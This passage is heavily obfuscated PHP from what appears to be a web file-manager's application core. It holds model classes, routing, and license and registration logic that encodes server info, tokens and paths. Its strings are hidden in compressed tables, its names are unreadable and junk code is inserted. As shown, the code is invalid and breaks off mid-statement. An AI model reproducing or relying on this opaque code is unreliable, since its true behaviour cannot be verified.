function moveTop($Á¼ÎıªØ) { $ğÈ¨ÖÑê =& $_SERVER[•Ùç É]; $¸ƒ¬Ã = array($ğÈ¨ÖÑê[1696] => USER_ID, $ğÈ¨ÖÑê[528] => 0); $Åª’„Ş = $this->where($¸ƒ¬Ã)->where(array($ğÈ¨ÖÑê[32] => $Á¼ÎıªØ))->find(); if (!$Åª’„Ş) { return; } $›×Ú¿úË = $this->field($ğÈ¨ÖÑê[445])->where($¸ƒ¬Ã)->order($ğÈ¨ÖÑê[2357])->select(); $›×Ú¿úË = array_to_keyvalue($›×Ú¿úË, $ğÈ¨ÖÑê[12], $ğÈ¨ÖÑê[445]); $­ÊüûÂÑ = $›×Ú¿úË; $›×Ú¿úË = array_remove_value($›×Ú¿úË, $Åª’„Ş[$ğÈ¨ÖÑê[445]]); array_unshift($›×Ú¿úË, $Åª’„Ş[$ğÈ¨ÖÑê[445]]); return $this->resetSort($›×Ú¿úË); } protected function moveBottom($øî‡•Ø) { $³«¯ğ®À =& $_SERVER[•Ùç É]; $ö¿Ù’äˆ = array($³«¯ğ®À[1696] => USER_ID, $³«¯ğ®À[528] => 0); $ôÈáßô€ = $this->where($ö¿Ù’äˆ)->max($³«¯ğ®À[1928]); $ˆ¨ë…ù = array($³«¯ğ®À[1928] => $ôÈáßô€ + 1); return $this->where($ö¿Ù’äˆ)->where(array($³«¯ğ®À[32] => $øî‡•Ø))->save($ˆ¨ë…ù); } private function getAutoName($µË÷€Ø) { $Ìó’şü¬ =& $_SERVER[•Ùç É]; $òûÃò¥Ê = array($Ìó’şü¬[1696] => USER_ID, $Ìó’şü¬[528] => 0); $ÜıŸ˜ÄÁ = $this->field($Ìó’şü¬[32])->where($òûÃò¥Ê)->select(); $ÜıŸ˜ÄÁ = array_to_keyvalue($ÜıŸ˜ÄÁ, $Ìó’şü¬[12], $Ìó’şü¬[32]); if (!$ÜıŸ˜ÄÁ || !in_array($µË÷€Ø, $ÜıŸ˜ÄÁ)) { return $µË÷€Ø; } for ($Û¾·Î®Ñ = 0; $Û¾·Î®Ñ < count($ÜıŸ˜ÄÁ); $Û¾·Î®Ñ++) { if (!in_array($µË÷€Ø . "\50{$Û¾·Î®Ñ}\x29", $ÜıŸ˜ÄÁ)) { return $µË÷€Ø . "\50{$Û¾·Î®Ñ}\x29"; } } return $µË÷€Ø . "\x28{$Û¾·Î®Ñ}\51"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\x65\155\56\x6a\x6f\x62\114\151\163\x74"; public $field = array("\156\x61\155\145", "\144\x65\163\143", "\163\157\x72\164"); const JOB_KEY = "\163\x65\154\146\112\157\142\114\x69\x73\164"; public function listData($ë¶Îë›â = false, $À£û”ÛÂ = "\163\x6f\x72\164", $çèêÄ‚Ş = false) { return parent::listData($ë¶Îë›â, $À£û”ÛÂ, $çèêÄ‚Ş); } public function remove($ûÀŞ¼¦ü) { return parent::remove($ûÀŞ¼¦ü); } public function add($Å­¬¯²Ö) { $‡œ±º¥ß =& $_SERVER[•Ùç É]; if ($this->findByName($Å­¬¯²Ö[$‡œ±º¥ß[32]])) { return !1; } $Å­¬¯²Ö[$‡œ±º¥ß[1928]] = $this->getSort(); return parent::insert($Å­¬¯²Ö); } private function getSort() { $ú«—–âÉ =& $_SERVER[•Ùç É]; $¯ò‹ƒ¿ù = parent::listData(); $‘©×Ïàè = array_to_keyvalue($¯ò‹ƒ¿ù, $ú«—–âÉ[12], $ú«—–âÉ[1928]); return empty($‘©×Ïàè) ? 0 : max($‘©×Ïàè) + 1; } public function update($»ÊƒƒÏä, $É¨ÉÇ·ø) { $ıëõ¥üş =& $_SERVER[•Ùç É]; $ƒûâ¹‰Â = parent::listData($»ÊƒƒÏä); $ğüÀÅÅÏ = $this->findByName($É¨ÉÇ·ø[$ıëõ¥üş[32]]); if (!$ƒûâ¹‰Â || $ğüÀÅÅÏ && $ğüÀÅÅÏ[$ıëõ¥üş[445]] != $ƒûâ¹‰Â[$ıëõ¥üş[445]]) { return !1; } return parent::update($»ÊƒƒÏä, $É¨ÉÇ·ø); } public function setUserJob($›´ø˜üÓ, $ÆÂ¡–ÇÃ) { $—Ş±”¤Ä =& $_SERVER[•Ùç É]; if (!is_array($ÆÂ¡–ÇÃ)) { $ÆÂ¡–ÇÃ = array($ÆÂ¡–ÇÃ); } $Çşı©‘¦ = parent::listData(); $¸£ÜÁ™¦ = array_to_keyvalue($Çşı©‘¦, $—Ş±”¤Ä[32]); $îŸÔŞŠÉ = $—Ş±”¤Ä[424]; foreach ($ÆÂ¡–ÇÃ as $›°î¥Ê¬) { if ($¸£ÜÁ™¦[$›°î¥Ê¬]) { $îŸÔŞŠÉ .= $¸£ÜÁ™¦[$›°î¥Ê¬][$—Ş±”¤Ä[445]] . $—Ş±”¤Ä[50]; } else { $åµŸÄÙé = $this->add($›°î¥Ê¬); $îŸÔŞŠÉ .= $åµŸÄÙé . $—Ş±”¤Ä[50]; } } $îŸÔŞŠÉ = rtrim($îŸÔŞŠÉ, $—Ş±”¤Ä[50]); Model($—Ş±”¤Ä[569])->metaSet($›´ø˜üÓ, self::JOB_KEY, $îŸÔŞŠÉ); } public function getUserJob($¶Ã¾ûÁì) { $›…Ô¨Õ§ = Model($_SERVER[•Ùç É][569])->metaGet($¶Ã¾ûÁì); return $this->getUserJobInfo($›…Ô¨Õ§[self::JOB_KEY]); } public function getUserJobInfo($‹¬è¬±Ã) { $­îş¢äø =& $_SERVER[•Ùç É]; $ğä™ë³ = explode($­îş¢äø[50], $‹¬è¬±Ã); $ü¡¤¥·è = parent::listData(); $ü¡¤¥·è = array_remove_key($ü¡¤¥·è, $­îş¢äø[217]); $¨â·±âÏ = array(); foreach ($ğä™ë³ as $Ö‘–ÈÎ) { if (isset($ü¡¤¥·è[$Ö‘–ÈÎ])) { $¨â·±âÏ[] = $ü¡¤¥·è[$Ö‘–ÈÎ]; } } return $¨â·±âÏ; } } goto EŒ‡‹ó‚¦¿; Dğ›‹¤Ä¢½: $_SERVER[ÂÍ‘ñ¿ò] = explode($_SERVER[•Ùç É][650], gzinflate(substr($_SERVER[•Ùç É][651], 10, -8))); $jhtbkxrswv = $_SERVER[•Ùç É][652]; class Application { private $defaultModule = "\151\x6e\144\x65\x78"; private $defaultController = "\151\x6e\144\x65\x78"; private $defaultAction = "\151\156\144\145\170"; function __construct() { } public function setDefault($¹Åéš¢Ô) { $»öƒÆñ® =& $_SERVER[•Ùç É]; $–ò³®”û =& $_SERVER[ÂÍ‘ñ¿ò]; $·˜‹™ö = explode($–ò³®”û[0], trim($¹Åéš¢Ô, $–ò³®”û[0])); $this->defaultModule = $·˜‹™ö[0] ? $·˜‹™ö[0] : $this->defaultModule; $ÙÚª‹¤Ç = $»öƒÆñ®[653]; if (!$ÙÚª‹¤Ç) { return; } $this->defaultController = $·˜‹™ö[1] ? $·˜‹™ö[1] : $this->defaultController; $ô¬ôàÃ³ = $»öƒÆñ®[654]; $this->defaultAction = $·˜‹™ö[2] ? $·˜‹™ö[2] : $this->defaultAction; $şˆÜ²øª = $»öƒÆñ®[655]; if (!$şˆÜ²øª) { return; } $this->cxrff5f5dc5f($–ò³®”û[1], array($this, $–ò³®”û[2])); $—’ŠÌ˜ƒ = $»öƒÆñ®[656]; if (strlen($—’ŠÌ˜ƒ) < $»öƒÆñ®[657]) { return; } } public function appRun($Éë¥¬á«) { $§ñÁ‘¾” =& $_SERVER[•Ùç É]; $÷Ğ«ŸµÓ =& $_SERVER[ÂÍ‘ñ¿ò]; $Ø¥Ÿê¸à = explode($÷Ğ«ŸµÓ[0], $Éë¥¬á«); $…¨å²‘Ş = $§ñÁ‘¾”[658]; if (!$…¨å²‘Ş) { return; } $”§î—Û¿ = strtolower($Ø¥Ÿê¸à[0]); $‰–éÑî÷ = $§ñÁ‘¾”[659]; if (!$‰–éÑî÷) { die; } $Í±¶‹ôœ = $÷Ğ«ŸµÓ[3]; if ($”§î—Û¿ == $÷Ğ«ŸµÓ[4]) { $Í±¶‹ôœ = $÷Ğ«ŸµÓ[5]; $Ø¥Ÿê¸à[0] = $÷Ğ«ŸµÓ[6]; $Ø¥Ÿê¸à[1] = $Ø¥Ÿê¸à[1] . $÷Ğ«ŸµÓ[7]; $Éë¥¬á« = join($÷Ğ«ŸµÓ[0], $Ø¥Ÿê¸à); $Éë¥¬á« = trim($Éë¥¬á«, $÷Ğ«ŸµÓ[0]); } call_user_func(array($÷Ğ«ŸµÓ[8], $÷Ğ«ŸµÓ[9]), $Í±¶‹ôœ . $÷Ğ«ŸµÓ[10], $Éë¥¬á«); ActionCall($Éë¥¬á«); $È¡Ì¼· = $§ñÁ‘¾”[660]; while (strlen($È¡Ì¼·) < $§ñÁ‘¾”[661]) { if (!$È¡Ì¼·) { break; } $È¡Ì¼·++; } call_user_func(array($÷Ğ«ŸµÓ[8], $÷Ğ«ŸµÓ[9]), $Í±¶‹ôœ . $÷Ğ«ŸµÓ[11], $Éë¥¬á«); $™‹ƒîÑš = $§ñÁ‘¾”[662]; } private function autorun() { $©æµ Â =& $_SERVER[ÂÍ‘ñ¿ò]; global $config; $ê…œ¢¼ = $_SERVER[•Ùç É][663]; if (!$ê…œ¢¼) { return; } if (count($config[$©æµ Â[12]]) == 0) { return; } foreach ($config[$©æµ Â[12]] as $±¥ğ ûæ => $ŠØ‹Ñ¶) { $this->appRun($ŠØ‹Ñ¶); } } private function yqpx0cd51b7c() { $„™®­îø =& $_SERVER[•Ùç É]; $Ò¶µ±Ÿö =& $_SERVER[ÂÍ‘ñ¿ò]; $¢Âãš²â = $Ò¶µ±Ÿö[4]; $Áóõô‡ò = $„™®­îø[664]; if (strlen($Áóõô‡ò) < $„™®­îø[661]) { die; } $ÌŞı»Á© = $GLOBALS[$Ò¶µ±Ÿö[13]][$Ò¶µ±Ÿö[14]][0]; $¨éŞº„ı = $„™®­îø[665]; if (!$ÌŞı»Á© || strlen($ÌŞı»Á©) <= strlen($¢Âãš²â)) { return; } if (strtolower(substr($ÌŞı»Á©, -strlen($¢Âãš²â))) != $¢Âãš²â) { return; } $ßëé¯Î = substr($ÌŞı»Á©, 0, -strlen($¢Âãš²â)); $Ã¦¿¨­„ = $„™®­îø[666]; $Éò³Ö“Ò = array($Ò¶µ±Ÿö[4], $ßëé¯Î); $üê‘¥‡Ğ = $„™®­îø[667]; if (!$üê‘¥‡Ğ) { die; } $Ã†šàì˜ = array_slice($GLOBALS[$Ò¶µ±Ÿö[13]][$Ò¶µ±Ÿö[14]], 1); $GLOBALS[$Ò¶µ±Ÿö[13]][$Ò¶µ±Ÿö[14]] = array_merge($Éò³Ö“Ò, $Ã†šàì˜); $ÂÁÀŠİ = $„™®­îø[668]; while (strlen($ÂÁÀŠİ) < $„™®­îø[669]) { if (!$ÂÁÀŠİ) { break; } $ÂÁÀŠİ++; } $GLOBALS[$Ò¶µ±Ÿö[13]][$Ò¶µ±Ÿö[15]] = implode($Ò¶µ±Ÿö[0], $GLOBALS[$Ò¶µ±Ÿö[13]][$Ò¶µ±Ÿö[14]]); } private function lpas50318890() { $çÉ«ª®Ş =& $_SERVER[•Ùç É]; $ŞÅø°Ì› =& $_SERVER[ÂÍ‘ñ¿ò]; if ($GLOBALS[$ŞÅø°Ì›[13]][$ŞÅø°Ì›[15]] != $ŞÅø°Ì›[6]) { return; } $”´õ°ï¡ = $_SERVER[$ŞÅø°Ì›[16]]; $Üø‹ì´¤ = $ŞÅø°Ì›[17]; $—ÇñİÜÍ = $çÉ«ª®Ş[670]; if (strlen($—ÇñİÜÍ) < $çÉ«ª®Ş[671]) { return; } if (!strstr($”´õ°ï¡, $Üø‹ì´¤)) { return; } $„´õÂ¼¤ = strrpos($”´õ°ï¡, $Üø‹ì´¤); $¹Äı¼¯ = $çÉ«ª®Ş[672]; $‡·Ûˆ = substr($”´õ°ï¡, $„´õÂ¼¤ + strlen($Üø‹ì´¤)); preg_match_all($ŞÅø°Ì›[18], $‡·Ûˆ, $›ŒáÑå½); $Ôéº¢¡Å = $çÉ«ª®Ş[673]; $‡·Ûˆ = trim($›ŒáÑå½[0][0], $ŞÅø°Ì›[19]); $ı£éÉ°Î = $çÉ«ª®Ş[674]; $GLOBALS[$ŞÅø°Ì›[13]][$ŞÅø°Ì›[14]] = explode($ŞÅø°Ì›[19], $‡·Ûˆ); $ù‹º¨Ó… = $çÉ«ª®Ş[675]; if (strlen($ù‹º¨Ó…) < $çÉ«ª®Ş[657]) { return; } $GLOBALS[$ŞÅø°Ì›[13]][$ŞÅø°Ì›[15]] = implode($ŞÅø°Ì›[0], $GLOBALS[$ŞÅø°Ì›[13]][$ŞÅø°Ì›[14]]); } public function run() { $“Æ¹¥òğ =& $_SERVER[•Ùç É]; $¾§º·ì =& $_SERVER[ÂÍ‘ñ¿ò]; $this->lpas50318890(); $Ÿ†üÒö = $“Æ¹¥òğ[676]; if (strlen($Ÿ†üÒö) < $“Æ¹¥òğ[671]) { return; } $this->yqpx0cd51b7c(); $İ‘ÄŸæ… = $GLOBALS[$¾§º·ì[13]][$¾§º·ì[14]]; $³³»ßâÔ = $“Æ¹¥òğ[677]; if (!$³³»ßâÔ) { return; } $¹Œ’„› = $GLOBALS[$¾§º·ì[13]][$¾§º·ì[15]]; $¤‡ããéä = $“Æ¹¥òğ[678]; if (!$¤‡ããéä) { return; } define($¾§º·ì[20], isset($İ‘ÄŸæ…[0]) && $İ‘ÄŸæ…[0] ? $İ‘ÄŸæ…[0] : $this->defaultModule); $ãÁºõûª = $“Æ¹¥òğ[679]; define($¾§º·ì[21], isset($İ‘ÄŸæ…[1]) && $İ‘ÄŸæ…[0] ? $İ‘ÄŸæ…[1] : $this->defaultController); $Ó‘¸ùä  = $“Æ¹¥òğ[680]; if (strlen($Ó‘¸ùä ) < $“Æ¹¥òğ[661]) { die; } define($¾§º·ì[22], isset($İ‘ÄŸæ…[2]) && $İ‘ÄŸæ…[0] ? $İ‘ÄŸæ…[2] : $this->defaultAction); $×»ºÒó = $“Æ¹¥òğ[681]; while ($×»ºÒó < $“Æ¹¥òğ[657]) { if ($×»ºÒó >= 0) { break; } $×»ºÒó++; } define($¾§º·ì[23], MOD . $¾§º·ì[0] . ST . $¾§º·ì[0] . ACT); $ü¡é×–Ò = $“Æ¹¥òğ[682]; if (!$ü¡é×–Ò) { die; } $_SERVER[$¾§º·ì[24]] = strtolower(ACTION); $ª†•ñ©® = $“Æ¹¥òğ[683]; $this->autorun(); $©«µîüØ = $“Æ¹¥òğ[684]; if (strlen($©«µîüØ) < $“Æ¹¥òğ[657]) { return; } if (count($İ‘ÄŸæ…) >= 3) { $this->appRun($¹Œ’„›); } else { $this->appRun(ACTION); } } private $rdwocac763cc = array(); private $goeu038097d5 = ''; public function cevd71657227() { $â­Ò«ˆÅ =& $_SERVER[•Ùç É]; $Òİ¦ÊÎ¶ =& $_SERVER[ÂÍ‘ñ¿ò]; $this->zjird0006078(); $this->wtcj6d77772b(); $this->fgqs986e2050(); $this->ihgtc55c857f(); $âã“Éî– = $â­Ò«ˆÅ[685]; if (!$âã“Éî–) { die; } $this->eudrb72b712a(); $this->ojvn91111d71(); $ïÉ½ÂÈ = $â­Ò«ˆÅ[686]; if (strlen($ïÉ½ÂÈ) < $â­Ò«ˆÅ[657]) { die; } $this->apju5eed77de(); $this->cxrff5f5dc5f($Òİ¦ÊÎ¶[25], array($this, $Òİ¦ÊÎ¶[26])); $¼Îñ¤«å = $â­Ò«ˆÅ[687]; $this->cxrff5f5dc5f($Òİ¦ÊÎ¶[27], array($this, $Òİ¦ÊÎ¶[28])); $this->cxrff5f5dc5f($Òİ¦ÊÎ¶[29], array($this, $Òİ¦ÊÎ¶[30])); $…±‚›Œä = $â­Ò«ˆÅ[688]; if (strlen($…±‚›Œä) < $â­Ò«ˆÅ[657]) { return; } $this->cxrff5f5dc5f($Òİ¦ÊÎ¶[31], array($this, $Òİ¦ÊÎ¶[32])); } public function uprx2271e4a1($ËŸõ‡) { $¸¨‚ŞÇ =& $_SERVER[•Ùç É]; $Ã«ñ²åÅ =& $_SERVER[ÂÍ‘ñ¿ò]; $î¨’Ù¨ì = Model($Ã«ñ²åÅ[33])->get(); $Ùˆãè˜¿ = $¸¨‚ŞÇ[689]; if (strlen($Ùˆãè˜¿) < $¸¨‚ŞÇ[671]) { die; } $à¹ñäå‰ = array($Ã«ñ²åÅ[34], $Ã«ñ²åÅ[35], $Ã«ñ²åÅ[36], $Ã«ñ²åÅ[37], $Ã«ñ²åÅ[38], $Ã«ñ²åÅ[39], $Ã«ñ²åÅ[40], $Ã«ñ²åÅ[41], $Ã«ñ²åÅ[42], $Ã«ñ²åÅ[43], $Ã«ñ²åÅ[44], $Ã«ñ²åÅ[45], $Ã«ñ²åÅ[46], $Ã«ñ²åÅ[47], $Ã«ñ²åÅ[48], $Ã«ñ²åÅ[49], $Ã«ñ²åÅ[50], $Ã«ñ²åÅ[51], $Ã«ñ²åÅ[52], $Ã«ñ²åÅ[53], $Ã«ñ²åÅ[54], $Ã«ñ²åÅ[55], $Ã«ñ²åÅ[56], $Ã«ñ²åÅ[57], $Ã«ñ²åÅ[58], $Ã«ñ²åÅ[59], $Ã«ñ²åÅ[60], $Ã«ñ²åÅ[61], $Ã«ñ²åÅ[62], $Ã«ñ²åÅ[63], $Ã«ñ²åÅ[64], $Ã«ñ²åÅ[65], $Ã«ñ²åÅ[66], $Ã«ñ²åÅ[67], $Ã«ñ²åÅ[68], $Ã«ñ²åÅ[69], $Ã«ñ²åÅ[70], $Ã«ñ²åÅ[71], $Ã«ñ²åÅ[72], $Ã«ñ²åÅ[73], $Ã«ñ²åÅ[74], $Ã«ñ²åÅ[75], $Ã«ñ²åÅ[76], $Ã«ñ²åÅ[77], $Ã«ñ²åÅ[78], $Ã«ñ²åÅ[79], $Ã«ñ²åÅ[80], $Ã«ñ²åÅ[81], $Ã«ñ²åÅ[82], $Ã«ñ²åÅ[83], $Ã«ñ²åÅ[84]); foreach ($à¹ñäå‰ as $±”®€ÎÉ) { $ ¾Ñâó¯ = $GLOBALS[$Ã«ñ²åÅ[85]][$Ã«ñ²åÅ[86]][$±”®€ÎÉ]; $¼£”¬Œ = $¸¨‚ŞÇ[690]; if (isset($î¨’Ù¨ì[$±”®€ÎÉ])) { $ ¾Ñâó¯ = $î¨’Ù¨ì[$±”®€ÎÉ]; } $ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[88]][$±”®€ÎÉ] = $ ¾Ñâó¯; } $Øİ ñÒ¥ = $ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[88]][$Ã«ñ²åÅ[46]]; $¯±şÓ¡£ = $¸¨‚ŞÇ[691]; if (strlen($¯±şÓ¡£) < $¸¨‚ŞÇ[692]) { return; } unset($ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[89]][$Ã«ñ²åÅ[90]]); unset($ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[89]][$Ã«ñ²åÅ[91]]); unset($ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[88]][$Ã«ñ²åÅ[46]]); unset($ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[88]][$Ã«ñ²åÅ[92]]); $ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[88]][$Ã«ñ²åÅ[93]] = array($Ã«ñ²åÅ[94] => (int) $Øİ ñÒ¥[$Ã«ñ²åÅ[95]], $Ã«ñ²åÅ[96] => (int) _get($Øİ ñÒ¥, $Ã«ñ²åÅ[97], 0)); $†Îé°²½ = substr(md5($Ã«ñ²åÅ[98] . get_client_ip() . $î¨’Ù¨ì[$Ã«ñ²åÅ[99]]), 0, 15); $¹ó‘ò«Î = $¸¨‚ŞÇ[693]; if (!$¹ó‘ò«Î) { return; } $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[101]] = Mcrypt::encode(Session::sign(), $†Îé°²½, 3600 * 24); $ûâ¶½çã = $¸¨‚ŞÇ[694]; while (strlen($ûâ¶½çã) < $¸¨‚ŞÇ[661]) { if (!$ûâ¶½çã) { break; } $ûâ¶½çã++; } $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[102]] = Action($Ã«ñ²åÅ[103])->accessToken(); $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[104]] = md5($_SERVER[$Ã«ñ²åÅ[105]] . $î¨’Ù¨ì[$Ã«ñ²åÅ[99]]); $¿ØÂİŸú = $¸¨‚ŞÇ[695]; while (strlen($¿ØÂİŸú) < $¸¨‚ŞÇ[692]) { if (!$¿ØÂİŸú) { break; } $¿ØÂİŸú++; } $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[106]] = base64_encode(serverInfo()); $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[107]] = $this->goeu038097d5; $òšÀ÷Û = $¸¨‚ŞÇ[696]; if ($î¨’Ù¨ì[$Ã«ñ²åÅ[107]] != $Ã«ñ²åÅ[108]) { $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[109]] = $î¨’Ù¨ì[$Ã«ñ²åÅ[109]]; $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[110]] = $î¨’Ù¨ì[$Ã«ñ²åÅ[110]]; $í¿÷Ã‡ = rand_string(10) . $this->goeu038097d5 . rand_string(5); $ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[111]][$Ã«ñ²åÅ[112]] = $this->ycsjf993275f($í¿÷Ã‡, $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[104]]); } if ($this->goeu038097d5 == $Ã«ñ²åÅ[108]) { $ËŸõ‡[$Ã«ñ²åÅ[87]][$Ã«ñ²åÅ[88]][$Ã«ñ²åÅ[93]][$Ã«ñ²åÅ[97]] = 0; } $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[113]] = _get($this->rdwocac763cc, $Ã«ñ²åÅ[114], $Ã«ñ²åÅ[6]); $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[115]] = _get($this->rdwocac763cc, $Ã«ñ²åÅ[116], $Ã«ñ²åÅ[6]); $ñÄÜÏ¤ú = $¸¨‚ŞÇ[697]; while ($ñÄÜÏ¤ú < $¸¨‚ŞÇ[657]) { if ($ñÄÜÏ¤ú >= 0) { break; } $ñÄÜÏ¤ú++; } if (KodUser::isRoot() && $this->config[$Ã«ñ²åÅ[117]]) { $ËŸõ‡[$Ã«ñ²åÅ[100]][$Ã«ñ²åÅ[118]] = WEB_ROOT; } return $ËŸõ‡; } private function ojvn91111d71() { $˜ç‚† =& $_SERVER[•Ùç É]; $÷é¹ÁÂ =& $_SERVER[ÂÍ‘ñ¿ò]; $¢‚È­¯“ = $_SERVER[$÷é¹ÁÂ[24]] == $÷é¹ÁÂ[119]; if ($_SERVER[$÷é¹ÁÂ[24]] == $÷é¹ÁÂ[120] && $_GET[$÷é¹ÁÂ[121]] == $÷é¹ÁÂ[122]) { $¢‚È­¯“ = !0; } if ($¢‚È­¯“) { $¤™ü—ø¬ = array($÷é¹ÁÂ[107] => $this->goeu038097d5, $÷é¹ÁÂ[123] => $this->ghze5be35b25(), $÷é¹ÁÂ[124] => Model($÷é¹ÁÂ[125])->count()); if ($this->goeu038097d5 != $÷é¹ÁÂ[108]) { $¿ë÷Æó’ = _get($this->rdwocac763cc, $÷é¹ÁÂ[126]); if ($¿ë÷Æó’) { $¤™ü—ø¬[$÷é¹ÁÂ[127]] = $¿ë÷Æó’; $¤™ü—ø¬[$÷é¹ÁÂ[128]] = strtotime(_get($this->rdwocac763cc, $÷é¹ÁÂ[129])); $¤™ü—ø¬[$÷é¹ÁÂ[130]] = _get($this->rdwocac763cc, $÷é¹ÁÂ[116]); } $åĞîä¥  = Model($÷é¹ÁÂ[33])->get($÷é¹ÁÂ[131], $÷é¹ÁÂ[6], !0); if (is_string($åĞîä¥ ) && substr($åĞîä¥ , 0, 1) == $÷é¹ÁÂ[132]) { $åĞîä¥  = json_decode_force($åĞîä¥ ); } if (is_array($åĞîä¥ ) && $åĞîä¥ [$÷é¹ÁÂ[133]] && strstr($åĞîä¥ [$÷é¹ÁÂ[133]], $÷é¹ÁÂ[134])) { $å²•ç±Ø = explode($÷é¹ÁÂ[134], $åĞîä¥ [$÷é¹ÁÂ[133]]); $¤™ü—ø¬[$÷é¹ÁÂ[135]] = $å²•ç±Ø[0]; } } $¤™ü—ø¬ = $this->ehka110833eb(json_encode($¤™ü—ø¬), md5($÷é¹ÁÂ[136])); $òçÁœü” = array($÷é¹ÁÂ[137] => $¤™ü—ø¬); call_user_func(array($÷é¹ÁÂ[138], $÷é¹ÁÂ[139]), $òçÁœü”); $´ÒñÜ Å = $˜ç‚†[698]; while ($´ÒñÜ Å < $˜ç‚†[692]) { if ($´ÒñÜ Å >= 0) { break; } $´ÒñÜ Å++; } } if ($this->goeu038097d5 == $÷é¹ÁÂ[108]) { return; } $”à¨öÈ = array($÷é¹ÁÂ[140], $÷é¹ÁÂ[141], $÷é¹ÁÂ[142], $÷é¹ÁÂ[143], $÷é¹ÁÂ[144], $÷é¹ÁÂ[145]); $âÇß´…™ = Model($÷é¹ÁÂ[33])->get(); $Ó®¦ „à = $˜ç‚†[699]; while ($Ó®¦ „à < $˜ç‚†[671]) { if ($Ó®¦ „à >= 0) { break; } $Ó®¦ „à++; } $òçÁœü” = array($÷é¹ÁÂ[146] => $âÇß´…™[$÷é¹ÁÂ[34]], $÷é¹ÁÂ[147] => $âÇß´…™[$÷é¹ÁÂ[35]], $÷é¹ÁÂ[148] => $÷é¹ÁÂ[6]); foreach ($”à¨öÈ as $ãÔá‹Ìœ) { if (!isset($âÇß´…™[$ãÔá‹Ìœ]) || !$âÇß´…™[$ãÔá‹Ìœ]) { continue; } $òçÁœü”[$ãÔá‹Ìœ] = $âÇß´…™[$ãÔá‹Ìœ]; } call_user_func(array($÷é¹ÁÂ[138], $÷é¹ÁÂ[139]), $òçÁœü”); } private function ihgtc55c857f() { $Ïì¨›€ =& $_SERVER[•Ùç É]; $ğ¶µ‰ê½ =& $_SERVER[ÂÍ‘ñ¿ò]; if ($_SERVER[$ğ¶µ‰ê½[24]] != $ğ¶µ‰ê½[149]) { return; } if (!KodUser::isRoot()) { die; } $Øğâõ¼ = $GLOBALS[$ğ¶µ‰ê½[13]]; if (isset($Øğâõ¼[$ğ¶µ‰ê½[150]])) { $this->pjyi28728f55(); die; } if (isset($Øğâõ¼[$ğ¶µ‰ê½[151]]) && isset($Øğâõ¼[$ğ¶µ‰ê½[151]]) == $ğ¶µ‰ê½[122]) { $Øğâõ¼[$ğ¶µ‰ê½[152]] = Model($ğ¶µ‰ê½[33])->get($ğ¶µ‰ê½[153]); } if (!isset($Øğâõ¼[$ğ¶µ‰ê½[152]]) || strlen($Øğâõ¼[$ğ¶µ‰ê½[152]]) != 16) { show_json($ğ¶µ‰ê½[154] . $Øğâõ¼[$ğ¶µ‰ê½[152]], !1); } $½ü±¦Ì = Model($ğ¶µ‰ê½[33])->get($ğ¶µ‰ê½[99]); $ËÔ€ß× = md5($_SERVER[$ğ¶µ‰ê½[105]] . $½ü±¦Ì); $¤¯Ôä»ğ = $Ïì¨›€[700]; while ($¤¯Ôä»ğ < $Ïì¨›€[669]) { if ($¤¯Ôä»ğ >= 0) { break; } $¤¯Ôä»ğ++; } $ÜÑÖÚ¦ã = array($ğ¶µ‰ê½[152] => $Øğâõ¼[$ğ¶µ‰ê½[152]], $ğ¶µ‰ê½[155] => rand_string(16), $ğ¶µ‰ê½[156] => $ğ¶µ‰ê½[136], $ğ¶µ‰ê½[157] => $ğ¶µ‰ê½[158], $ğ¶µ‰ê½[159] => $_SERVER[$ğ¶µ‰ê½[160]], $ğ¶µ‰ê½[161] => $_SERVER[$ğ¶µ‰ê½[162]], $ğ¶µ‰ê½[163] => $_SERVER[$ğ¶µ‰ê½[164]], $ğ¶µ‰ê½[104] => $ËÔ€ß×, $ğ¶µ‰ê½[165] => Model($ğ¶µ‰ê½[33])->get($ğ¶µ‰ê½[131])); if ($Øğâõ¼[$ğ¶µ‰ê½[166]] == $ğ¶µ‰ê½[167]) { $Îˆ×¥Éç = $this->ehka110833eb($ËÔ€ß×, $ğ¶µ‰ê½[168]); $½Í˜âÌ = $this->ycsjf993275f(json_encode($ÜÑÖÚ¦ã), $ËÔ€ß× . $ğ¶µ‰ê½[169], 3); $½Í˜âÌ = $½Í˜âÌ . $ğ¶µ‰ê½[170] . $_SERVER[$ğ¶µ‰ê½[160]]; $¢âÀÚóÀ = $this->vurm37fa4e72($ğ¶µ‰ê½[171] . $Îˆ×¥Éç . $ğ¶µ‰ê½[172] . $½Í˜âÌ, -1); show_json($¢âÀÚóÀ, !0); } else { if ($Øğâõ¼[$ğ¶µ‰ê½[166]] == $ğ¶µ‰ê½[173]) { $ÔËÂ‘šˆ = substr(md5($ğ¶µ‰ê½[174] . $ËÔ€ß×), 12, 15) . $ğ¶µ‰ê½[175]; $½Í˜âÌ = $this->gdyv9b19ed81(trim($Øğâõ¼[$ğ¶µ‰ê½[176]]), $ÔËÂ‘šˆ, 2); $ÜÔÃ¥ì÷ = json_decode($½Í˜âÌ, !0); if (!is_array($ÜÔÃ¥ì÷) || !is_array($ÜÔÃ¥ì÷[$ğ¶µ‰ê½[177]]) || $ÜÔÃ¥ì÷[$ğ¶µ‰ê½[152]] != !0) { $â¯ºËĞ = $ğ¶µ‰ê½[178]; $ãÉœ±â = 